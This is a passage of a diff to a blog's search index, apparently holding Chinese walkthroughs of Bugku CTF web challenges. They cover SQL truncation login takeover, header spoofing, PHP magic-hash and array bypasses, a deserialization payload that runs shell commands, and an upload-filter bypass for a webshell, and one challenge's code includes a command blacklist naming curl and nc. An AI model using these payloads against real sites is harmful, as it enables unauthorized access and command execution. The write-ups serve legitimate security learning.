class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
-<p>这里注册时使用用户名+【大量空格】和随机密码注册即可完成攻击。</p>
-<p>    主要原理就是<code>insert</code>时候有<code>varchar(n)</code>的限制，大于n的时候会截取前n个存入。在数据库对字符串进行比较时，即select操作，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致。注册时select语句不会将<code>admin+[大量空格]</code>删减到n位，所以不会被select查出与admin重复，不会返回数据，接下来就可以插入<code>admin+[空格]（截取）</code>和自定义密码了。</p>
-<p>    如果使用用户名<code>“vampire”</code>和密码“<code>random_pass</code>”登录的话，对比时是<code>admin</code>与<code>admin+[大量空格]</code>，会将前面的<code>admin</code>添加空格与后面的长度相同在进行对比，那么返回的只能是我们自己注册的用户信息，而不会返回目标用户信息。SQL查询语句是一个and操作，如果密码不一样怎么会把目标用户的信息也返回回来?</p>
-<p>    当登陆时使用admin与自定义密码登陆，数据库将返回我们自己注册的账户信息，但是注意此处的<code>return $username</code>，虽然此时查询出来的是我们自己的用户信息，但是返回的用户名则是目标的用户名。如果此后的业务逻辑直接以该用户名为准，则我们就达到了水平越权的目的。</p>
-]]></content>
-      <tags>
-        <tag>Bugku Web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>区块链学习</title>
     <url>/2020/11/11/20201111/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><hr>
@@ -558,6 +232,374 @@
 ]]></content>
       <tags>
         <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bugku Web25</title>
+    <url>/2021/04/26/Bugku-Web25/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web-25"><a href="#Bugku-Web-25" class="headerlink" title="Bugku Web 25"></a>Bugku Web 25</h1><blockquote>
+<p>提示是SQL约束攻击</p>
+</blockquote>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>&emsp;&emsp;进入场景，看到是一个web管理系统，需要登陆，旁边可以看到注册的通道，先随意注册一个账号<br><img src="https://i.loli.net/2021/04/26/T3y4NEZFHDtqQ8a.png" alt="1.png"><br><img src="https://i.loli.net/2021/04/26/Itpq6YvGl3Z4OP2.png" alt="2.jpg"><br><img src="https://i.loli.net/2021/04/26/xUlTGruCJoZKLm9.png" alt="3.png"></p>
+<p>&emsp;&emsp;推测只有管理员账户才会显示出flag，利用SQL约束攻击，SQL语句会将查询的字段后的空格格式化，随意我们注册的用户名为<code>admin </code>，此时再登录就可以得到flag<br><img src="https://i.loli.net/2021/04/26/iIjEn9GfueochHr.png" alt="4.png"></p>
+<h2 id="SQL约束攻击"><a href="#SQL约束攻击" class="headerlink" title="SQL约束攻击"></a>SQL约束攻击</h2><p>&emsp;&emsp;例如下面的代码中，输入的字符串末尾空格会被删除，<code>admin</code>与<code>admin     </code>是一样的,这是因为在“字符串比较”期间，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$username = mysql_real_escape_string($_GET[&#x27;username&#x27;]);</span><br><span class="line">$password = mysql_real_escape_string($_GET[&#x27;password&#x27;]);</span><br><span class="line">$query = &quot;<span class="keyword">SELECT</span> *</span><br><span class="line">          <span class="keyword">FROM</span> <span class="keyword">users</span></span><br><span class="line">          <span class="keyword">WHERE</span> username=<span class="string">&#x27;$username&#x27;</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">$res = mysql_query($query, $database);</span></span><br><span class="line"><span class="string">if($res) &#123;</span></span><br><span class="line"><span class="string">  if(mysql_num_rows($res) &gt; 0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else &#123;</span></span><br><span class="line"><span class="string">    $query = &quot;</span><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span>(username, <span class="keyword">password</span>)</span><br><span class="line">              <span class="keyword">VALUES</span> (<span class="string">&#x27;$username&#x27;</span>,<span class="string">&#x27;$password&#x27;</span>)<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp; 当注册时，后台一般先select一下用户名看看是否存在，然后再insert</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$username = mysql_real_escape_string($_GET[&#x27;username&#x27;]);</span><br><span class="line">$password = mysql_real_escape_string($_GET[&#x27;password&#x27;]);</span><br><span class="line">$query = &quot;<span class="keyword">SELECT</span> *</span><br><span class="line">          <span class="keyword">FROM</span> <span class="keyword">users</span></span><br><span class="line">          <span class="keyword">WHERE</span> username=<span class="string">&#x27;$username&#x27;</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">$res = mysql_query($query, $database);</span></span><br><span class="line"><span class="string">if($res) &#123;</span></span><br><span class="line"><span class="string">  if(mysql_num_rows($res) &gt; 0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else &#123;</span></span><br><span class="line"><span class="string">    $query = &quot;</span><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span>(username, <span class="keyword">password</span>)</span><br><span class="line">              <span class="keyword">VALUES</span> (<span class="string">&#x27;$username&#x27;</span>,<span class="string">&#x27;$password&#x27;</span>)<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
+<p>这里注册时使用用户名+【大量空格】和随机密码注册即可完成攻击。</p>
+<p>    主要原理就是<code>insert</code>时候有<code>varchar(n)</code>的限制，大于n的时候会截取前n个存入。在数据库对字符串进行比较时，即select操作，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致。注册时select语句不会将<code>admin+[大量空格]</code>删减到n位，所以不会被select查出与admin重复，不会返回数据，接下来就可以插入<code>admin+[空格]（截取）</code>和自定义密码了。</p>
+<p>    如果使用用户名<code>“vampire”</code>和密码“<code>random_pass</code>”登录的话，对比时是<code>admin</code>与<code>admin+[大量空格]</code>，会将前面的<code>admin</code>添加空格与后面的长度相同在进行对比，那么返回的只能是我们自己注册的用户信息，而不会返回目标用户信息。SQL查询语句是一个and操作，如果密码不一样怎么会把目标用户的信息也返回回来?</p>
+<p>    当登陆时使用admin与自定义密码登陆，数据库将返回我们自己注册的账户信息，但是注意此处的<code>return $username</code>，虽然此时查询出来的是我们自己的用户信息，但是返回的用户名则是目标的用户名。如果此后的业务逻辑直接以该用户名为准，则我们就达到了水平越权的目的。</p>
+]]></content>
+      <tags>
+        <tag>Bugku Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bugku Web26</title>
+    <url>/2021/04/26/Bugku-Web26/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web26"><a href="#Bugku-Web26" class="headerlink" title="Bugku Web26"></a>Bugku Web26</h1><blockquote>
+<p>Google</p>
+</blockquote>
+<p>进入场景，只有一行小字</p>
+<blockquote>
+<p>are you from google<br>推测应该将Referer改为谷歌的网址<br>用hackbar或者burpsuite都可以做到<br><img src="https://i.loli.net/2021/04/26/csMgnaRJ1Vr5OSz.png" alt="1.png"><br><img src="https://i.loli.net/2021/04/26/pPDgWoYyNB9vtjk.png" alt="2.png"></p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>Bugku Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bugku Web27</title>
+    <url>/2021/04/26/Bugku-Web27/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web27"><a href="#Bugku-Web27" class="headerlink" title="Bugku Web27"></a>Bugku Web27</h1><blockquote>
+<p>提示：md5 collision</p>
+</blockquote>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>&emsp;&emsp;进入场景，发现整个页面只有一句话<code>please input a</code>，结合提示应该利用md5碰撞猜出a的值，进而得到flag<br>但是这个环境没有源码，所幸在评论区有老哥提供了源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$md51 = md5(<span class="string">&#x27;QNKCDZO&#x27;</span>);</span><br><span class="line">$a = @$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line">    <span class="keyword">if</span> ($a != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;nctf&#123;*****************&#125;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;false!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;please input a&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;通过查看源码可以发现，a的值要与<code>QNKCDZO</code>不同，但是他们的md5值要”==”,首先可以得到$md51的值为<code>0e830400451993494058024219903391</code>是0e开头的，而且比较用的是<code>==</code>而非<code>===</code>,该值会被解释为科学计数法，即为0的n次方，结果都为0，所以我们只需让a的md5值也为0e开头，比如<code>240610708</code>,其md5值为<code>0e462097431906509019562988736854</code>。</p>
+<p>&emsp;&emsp;构造输入<code>http://114.67.246.176:14991/?a=240610708</code>,即可得到flag<code>flag&#123;928c4b84b2bbe0904ea63baa2b5e7f26&#125;</code></p>
+<h2 id="php中运算符"><a href="#php中运算符" class="headerlink" title="php中运算符"></a>php中运算符</h2><p><img src="https://i.loli.net/2021/04/26/kR6PwZgad8rmvus.png" alt="3.png"></p>
+<h2 id="常见的以0e-开头的MD5碰撞"><a href="#常见的以0e-开头的MD5碰撞" class="headerlink" title="常见的以0e 开头的MD5碰撞"></a>常见的以0e 开头的MD5碰撞</h2><p>QNKCDZO<br>0e830400451993494058024219903391<br>240610708<br>0e462097431906509019562988736854<br>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s1885207154a<br>0e509367213418206700842008763514<br>s1502113478a<br>0e861580163291561247404381396064<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s155964671a<br>0e342768416822451524974117254469<br>s1184209335a<br>0e072485820392773389523109082030<br>s1665632922a<br>0e731198061491163073197128363787<br>s1502113478a<br>0e861580163291561247404381396064<br>s1836677006a<br>0e481036490867661113260034900752<br>s1091221200a<br>0e940624217856561557816327384675<br>s155964671a<br>0e342768416822451524974117254469<br>s1502113478a<br>0e861580163291561247404381396064<br>s155964671a<br>0e342768416822451524974117254469<br>s1665632922a<br>0e731198061491163073197128363787<br>s155964671a<br>0e342768416822451524974117254469<br>s1091221200a<br>0e940624217856561557816327384675<br>s1836677006a<br>0e481036490867661113260034900752<br>s1885207154a<br>0e509367213418206700842008763514<br>s532378020a<br>0e220463095855511507588041205815<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s214587387a<br>0e848240448830537924465865611904<br>s1502113478a<br>0e861580163291561247404381396064<br>s1091221200a<br>0e940624217856561557816327384675<br>s1665632922a<br>0e731198061491163073197128363787<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s1665632922a<br>0e731198061491163073197128363787<br>s878926199a<br>0e545993274517709034328855841020</p>
+]]></content>
+      <tags>
+        <tag>Bugku Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bugku Web28</title>
+    <url>/2021/04/26/Bugku-Web28/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web28"><a href="#Bugku-Web28" class="headerlink" title="Bugku Web28"></a>Bugku Web28</h1><blockquote>
+<p>提示：请从本地访问</p>
+</blockquote>
+<p>&emsp;&emsp;这道题与之前一道一样，通过burp在header中加上<code>X-Forwarded-For: 127.0.0.1</code>即可得到flag<br><img src="https://i.loli.net/2021/04/26/YV2qiQy4kZGR8sd.png" alt="2.png"></p>
+]]></content>
+      <tags>
+        <tag>Bugku Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bugku Web29</title>
+    <url>/2021/04/26/Bugku-Web29/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web29"><a href="#Bugku-Web29" class="headerlink" title="Bugku Web29"></a>Bugku Web29</h1><blockquote>
+<p>提示：各种绕过</p>
+</blockquote>
+<p>&emsp;&emsp;进入环境，看到了如下一段代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">$_GET[<span class="string">&#x27;id&#x27;</span>] = urldecode($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">$flag = <span class="string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;uname&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;uname&#x27;</span>] == $_POST[<span class="string">&#x27;passwd&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;passwd can not be uname.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">&#x27;uname&#x27;</span>]) === sha1($_POST[<span class="string">&#x27;passwd&#x27;</span>])&amp;($_GET[<span class="string">&#x27;id&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.$flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;sorry!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;经过分析可以知道传入了三个参数，uname和id通过GET传入，passwd通过post传入，绕过条件是uname和passwd不能’==’而且他们的sha1要’==’，这时可以通过数组来绕过sha1构造输入<code>http://114.67.246.176:13764/?id=margin&amp;uname[]=12</code>,并通过hackbar 通过post传递<code>passwd[]=11</code>,便可成功绕过得到flag<br><img src="https://i.loli.net/2021/04/26/UpgSORAfkr4ajZF.png" alt="2.png"></p>
+<p>此处附上php中各种类型的比较</p>
+<p><img src="https://i.loli.net/2021/04/26/TDdn5l12otYbSxB.png" alt="3.png"></p>
+]]></content>
+      <tags>
+        <tag>Bugku Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bugku Web 安慰奖</title>
+    <url>/2021/04/27/Bugku-Web-%E5%AE%89%E6%85%B0%E5%A5%96/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web-安慰奖"><a href="#Bugku-Web-安慰奖" class="headerlink" title="Bugku Web 安慰奖"></a>Bugku Web 安慰奖</h1><p>&emsp;&emsp;进入场景一片空白，查看源码发现<code>YmFja3Vwcw==</code>用base64解码得到backups，所以需要查看备份文件，用御剑扫描网站页面，发现了index.php.bak，访问后得到了一段如下的代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $username = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $cmd = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$cmd</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            $a = `<span class="keyword">$this</span>-&gt;cmd`;</span><br><span class="line">            var_dump($a);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $select = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;分析可知我们需要传入code参数，内容是一段序列化的代码，代码在传入之后会被执行，以此构建payload,同时可以发现通过正则式过滤掉了一些输入，发现tac没有被过滤因此使用tac命令</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $cmd=<span class="string">&#x27;tac flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ctf=<span class="keyword">new</span> ctf();</span><br><span class="line"><span class="keyword">echo</span> serialize($ctf);</span><br><span class="line">;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行后得到<br><code>O:3:&quot;ctf&quot;:2:&#123;s:11:&quot;*username&quot;;s:5:&quot;admin&quot;;s:6:&quot;*cmd&quot;;s:12:&quot;tac flag.php&quot;;&#125;</code><br>为了绕过_wakeup<code>原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</code>，将对象数改为大于3的，同时为了绕过protected，在变量名前后加上%00，此时构造好的URL为<code>http://114.67.246.176:11386/?code=O:3:&quot;ctf&quot;:3:&#123;s:11:&quot;%00*%00username&quot;;s:5:&quot;admin&quot;;s:6:&quot;%00*%00cmd&quot;;s:12:&quot;tac%20flag.php&quot;;&#125;</code><br>之后便得到了flag<br>flag{Unser1alize_and_2CE_Add} </p>
+]]></content>
+      <tags>
+        <tag>Bugku Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bugku Web30</title>
+    <url>/2021/04/27/Bugku-Web30/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web30"><a href="#Bugku-Web30" class="headerlink" title="Bugku Web30"></a>Bugku Web30</h1><blockquote>
+<p>描述：txt</p>
+</blockquote>
+<p>&emsp;&emsp;进入场景，看到如下的代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line"><span class="keyword">if</span> ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;This is flag:&quot;</span> .<span class="string">&quot; <span class="subst">$flag</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;其中的几个函数的功能分别如下所示：</p>
+<p>&emsp;&emsp;extract()   </p>
+<p>&emsp;&emsp;函数从数组中将变量导入到当前的符号表。  </p>
+<p>&emsp;&emsp;语法：<code>extract(array,extract_rules,prefix)</code>  </p>
+<p>&emsp;&emsp;该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。该函数返回成功导入到符号表中的变量数目。</p>
+<p>&emsp;&emsp;file_get_contents()</p>
+<p>&emsp;&emsp;把整个文件读入一个字符串中。</p>
+<p>&emsp;&emsp;语法：</p>
+<p>&emsp;&emsp;<code>file_get_contents(path,include_path,context,start,max_length)</code></p>
+<p>&emsp;&emsp;该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。</p>
+<p>&emsp;&emsp;trim()</p>
+<p>&emsp;&emsp;函数移除字符串两侧的空白字符或其他预定义字符。</p>
+<p>&emsp;&emsp;语法<code>trim(string,charlist)</code></p>
+<p>&emsp;&emsp;经过分析，该段代码是将通过GET方法传入的参数赋值给其中某个变量，传入的参数如果和$fn文件中的字符一致时，便可以得到flag，题目的提示是txt，尝试访问flag.txt,浏览器显示了一下内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bugku</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;因此$ac的值便应该是bugku，此时尝试构造输入<code>http://114.67.246.176:11360/?ac=bugku</code>结果返回了sorry！，可能fn也需要传值，再构造<code>http://114.67.246.176:11360/?ac=bugku&amp;fn=flag.txt</code>,此时正确返回了flag</p>
+<p><img src="https://i.loli.net/2021/04/27/OI9cKMUoXQWZmax.png" alt="1.png"></p>
+]]></content>
+      <tags>
+        <tag>Bugku Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bugku Web31</title>
+    <url>/2021/04/28/Bugku-Web31/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web31"><a href="#Bugku-Web31" class="headerlink" title="Bugku Web31"></a>Bugku Web31</h1><blockquote>
+<p>提示：好像需要管理员</p>
+</blockquote>
+<p>&emsp;&emsp;进来就是一个404<br><img src="https://i.loli.net/2021/04/28/iXSIzqwmAWcsyfR.png" alt="1.png"><br>&emsp;&emsp;御剑扫描发现robots.txt<br><img src="https://i.loli.net/2021/04/28/lWKLJzRFhQA4dNx.png" alt="2.png"><br>&emsp;&emsp;访问robots.txt看到resusl.php<br><img src="https://i.loli.net/2021/04/28/Z6ciQrAa4n78vGJ.png" alt="3.png"><br>&emsp;&emsp;访问resusl.php，发现需要传参x<br><img src="https://i.loli.net/2021/04/28/FqXZd9yv7KTDBmn.png" alt="4.png"><br>&emsp;&emsp;尝试admin，因为一直提示管理员，得到flag<br><img src="https://i.loli.net/2021/04/28/xDAuw1N4CvQ5tEP.png" alt="5.png"></p>
+]]></content>
+      <tags>
+        <tag>Bugku Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bugku Web32</title>
+    <url>/2021/04/28/Bugku-Web32/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web32"><a href="#Bugku-Web32" class="headerlink" title="Bugku Web32"></a>Bugku Web32</h1><p>这个题有些许的坑（如果独自做题的话需要猜源码中过滤了什么），这里直接贴源码，可以发现白名单里有php4，并且还要求<code>multipart/form-data</code>不能是<code>multipart/form-data</code>,所以上传的时候需要将<code>multipart/form-data</code>改成<code>Multipart/form-data</code>来绕过检测，直接burp修改数据包，然后用蚁剑连接，便可以找到flag</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$flag = <span class="string">&quot;flag&#123;test&#125;&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">My name is margin,give me a image file not a php&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span> /&gt; </span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">global_filter</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$type =  $_SERVER[<span class="string">&quot;CONTENT_TYPE&quot;</span>];</span><br><span class="line">	<span class="keyword">if</span> (strpos($type,<span class="string">&quot;multipart/form-data&quot;</span>) !== <span class="literal">False</span>)&#123;</span><br><span class="line">		$file_ext =  substr($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext);</span><br><span class="line">		<span class="keyword">if</span> (stripos($file_ext,<span class="string">&quot;php&quot;</span>) !== <span class="literal">False</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;Invalid File&lt;br /&gt;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">global_filter();</span><br><span class="line"><span class="keyword">if</span> ((stripos($_FILES[<span 